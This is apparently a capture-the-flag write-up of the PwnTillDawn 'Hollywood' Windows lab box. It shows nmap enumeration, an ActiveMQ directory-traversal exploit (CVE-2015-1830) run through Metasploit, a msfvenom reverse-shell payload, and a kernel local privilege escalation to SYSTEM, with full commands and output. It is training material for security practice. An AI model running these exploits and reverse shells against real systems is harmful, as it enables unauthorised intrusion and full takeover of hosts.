---
title: "PwnTillDawn - Hollywood"
author: Nasrallah
description: ""
date: 2025-05-01 07:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, windows, easy, metasploit]
img_path: /assets/img/pwntilldawn/hollywood
image:
    path: hollywood.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Hollywood](https://online.pwntilldawn.com/Target/Show/) from [PwnTillDawn](https://online.pwntilldawn.com/) is running

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.219      
Host is up (0.16s latency).              
Not shown: 976 closed tcp ports (reset)  
PORT      STATE SERVICE      VERSION     
21/tcp    open  ftp          FileZilla ftpd 0.9.41 beta             
| ftp-syst:           
|_  SYST: UNIX emulated by FileZilla     
25/tcp    open  smtp         Mercury/32 smtpd (Mail server account Maiser)         
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME 
79/tcp    open  finger       Mercury/32 fingerd                     
| finger: Login: Admin         Name: Mail System Administrator\x0D  
| \x0D 
|_[No profile information]\x0D           
80/tcp    open  http         Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)                  
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38              
| http-title: Welcome to XAMPP           
|_Requested resource was http://10.150.150.219/dashboard/           
106/tcp   open  pop3pw       Mercury/32 poppass service             
110/tcp   open  pop3         Mercury/32 pop3d                       
|_pop3-capabilities: UIDL USER TOP APOP EXPIRE(NEVER)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
143/tcp   open  imap         Mercury/32 imapd 4.62
|_imap-capabilities: complete CAPABILITY OK AUTH=PLAIN IMAP4rev1 X-MERCURY-1A0001
443/tcp   open  ssl/http     Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47          
|_Not valid after:  2019-11-08T23:48:47          
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
| tls-alpn:  
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://10.150.150.219/dashboard/
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.56
8089/tcp  open  ssl/http     Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-28T09:17:32
|_Not valid after:  2022-10-27T09:17:32
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
8161/tcp  open  http     syn-ack Jetty 8.1.16.v20140903
|_http-favicon: Unknown favicon MD5: 05664FB0C7AFCD6436179437E31F3AA6
|_http-title: Apache ActiveMQ
|_http-server-header: Jetty(8.1.16.v20140903)
| http-methods: 
|_  Supported Methods: GET HEAD
10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  unknown
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  msrpc        Microsoft Windows RPC
61613/tcp open  stomp    syn-ack Apache ActiveMQ 5.10.1 - 5.11.1
61614/tcp open  http     syn-ack Jetty 8.1.16.v20140903
Service Info: Hosts: localhost, HOLLYWOOD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-22T10:35:24
|_  start_date: 2020-04-02T14:13:04
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: -2h18m10s, deviation: 4h37m03s, median: 21m46s
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: Hollywood
|   NetBIOS computer name: HOLLYWOOD\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-04-22T18:35:26+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

The target is a windows box with multiple ports open. We have mail services(POP3, IMAP, SMTP), HTTP servers(Apache, IIS...) and the typical windows services like SMB and msrpc.

There is a lot to go through in this box but I will go directly to the how I gained foothold on this box.

## **Foothold**

After checking all the services for default credential authentication, outdated and vulnerable services we finally find a hit with port 61613

```text
61613/tcp open  stomp    syn-ack Apache ActiveMQ 5.10.1 - 5.11.1
```

This port is running `ActiveMQ 5.10.1 - 5.11.1`, and after some research on google with find the [CVE-2015-1830](https://nvd.nist.gov/vuln/detail/cve-2015-1830).

>Directory traversal vulnerability in the fileserver upload/download functionality for blob messages in Apache ActiveMQ 5.x before 5.11.2 for Windows allows remote attackers to create JSP files in arbitrary directories via unspecified vectors.
{: .prompt-info }

The exploit for this vulnerability can be found in metasploit with the name `exploit/multi/http/apache_activemq_upload_jsp`.

```terminal
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_activemq_upload_jsp) >> set rhosts 10.150.150.219
rhosts => 10.150.150.219
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_activemq_upload_jsp) >> set lhost tun0
lhost => 10.66.66.230
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_activemq_upload_jsp) >> exploit
[*] Started reverse TCP handler on 10.66.66.230:4444 
[*] Uploading http://10.150.150.219:8161/C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//DhYnsDUvYhY.jar
[*] Uploading http://10.150.150.219:8161/C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//DhYnsDUvYhY.jsp
[*] Sending stage (58073 bytes) to 10.150.150.219
[+] Deleted C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//DhYnsDUvYhY.jsp
[*] Meterpreter session 1 opened (10.66.66.230:4444 -> 10.150.150.219:49316) at 2025-04-22 12:32:02 +0100
[!] This exploit may require manual cleanup of 'C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//DhYnsDUvYhY.jar' on the target

(Meterpreter 1)(C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin) > getuid
Server username: User
```

## **Privilege Escalation**

Now let's run exploit suggester module.

We background our session and select the module

```terminal
(Meterpreter 3)(C:\Users\User\Downloads) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/http/apache_activemq_upload_jsp) >> use post/multi/recon/local_exploit_suggester
```

Now we set the session and run the module

```terminal
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set session 1  
session => 1          
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> exploit        
[*] 10.150.150.219 - Collecting local exploits for java/windows...  
[*] 10.150.150.219 - 202 exploit checks are being tried...          
[+] 10.150.150.219 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.       
[+] 10.150.150.219 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.             
[+] 10.150.150.219 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.                  
[+] 10.150.150.219 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.         
[*] Running check method for exploit 42 / 42                        
[*] 10.150.150.219 - Valid modules for session 1:                   
============================             

 #   Name             Potentially Vulnerable?  Check Result                        
 -   ----             -----------------------  ------------                        
 1   exploit/windows/local/ikeext_serviceYes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.   
```

We got 4 exploits but after trying them nothing worked.

Let's try upgrading our meterpreter shell from `java/meterpreter/reverse_tcp` to `windows/meterpreter/reverse_tcp`

First we generate the payload using `msfvenom`

```terminal
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.66.66.230 LPORT=5555 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: rev.exe
```

I'll setup a multi handler listener with the same options we used in the msfvenom command above and run it in the background with `run -j`.

```terminal
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp         
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set payload windows/meterpreter/reverse_tcp                 
payload => windows/meterpreter/reverse_tcp      
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lhost tun0
lhost => tun0        
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lport 5555
lport => 5555                                
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> run -j        
[*] Exploit running as background job 0.        
[*] Exploit completed, but no session was created.             
[msf](Jobs:1 Agents:1) exploit(multi/handler) >>
[*] Started reverse TCP handler on 10.66.66.230:5555 
```

I'll go back the meterpreter session with `session 1` and upload the rev.exe file we created.

```terminal
(Meterpreter 1)(C:\Users\User\Downloads) > upload rev.exe
[*] Uploading  : /home/sirius/ctf/ptd/hollywood/rev.exe -> rev.exe
[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): /home/sirius/ctf/ptd/hollywood/rev.exe -> rev.exe
[*] Completed  : /home/sirius/ctf/ptd/hollywood/rev.exe -> rev.exe
(Meterpreter 1)(C:\Users\User\Downloads) >
```

Now I'll drop to a normal shell and run the exe file.

```terminal
C:\Users\User\Downloads>.\rev.exe
.\rev.exe

C:\Users\User\Downloads>
[*] Sending stage (177734 bytes) to 10.150.150.219
background[*] Meterpreter session 2 opened (10.66.66.230:5555 -> 10.150.150.219:49289) at 2025-04-26 11:17:11 +0100
```

We got the new meterpreter session.

Let's exit the current session and go back to exploit suggester, set the new session and rerun it.

```terminal
[msf](Jobs:0 Agents:2) post(multi/recon/local_exploit_suggester) >> exploit                                                                                                         [153/1476]
[*] 10.150.150.219 - Collecting local exploits for x86/windows...
[*] 10.150.150.219 - 202 exploit checks are being tried...
[+] 10.150.150.219 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.150.150.219 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.150.150.219 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detec
ted!
[+] 10.150.150.219 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.150.150.219 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.150.150.219 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.150.150.219 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.150.150.219 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.150.150.219 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.150.150.219 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.150.150.219 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.150.150.219 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.150.150.219 - Valid modules for session 4:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 b
uild detected!
 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

We got more results this time!

Trying the new ones, `exploit/windows/local/ntusermndragover` gives us a system shell.

```terminal
[msf](Jobs:0 Agents:1) exploit(windows/local/ntusermndragover) >> run
[*] Started reverse TCP handler on 10.66.66.230:4443
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Reflectively injecting the exploit DLL and running the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 5552 launched.
[*] Reflectively injecting the DLL into 5552...               
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.150.150.219
[*] Meterpreter session 5 opened (10.66.66.230:4443 -> 10.150.150.219:49292) at 2025-04-26 11:22:23 +0100

(Meterpreter 5)(C:\Users\User\Downloads) > getuid             
Server username: NT AUTHORITY\SYSTEM        
```

## **References**

<https://nvd.nist.gov/vuln/detail/cve-2015-1830>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
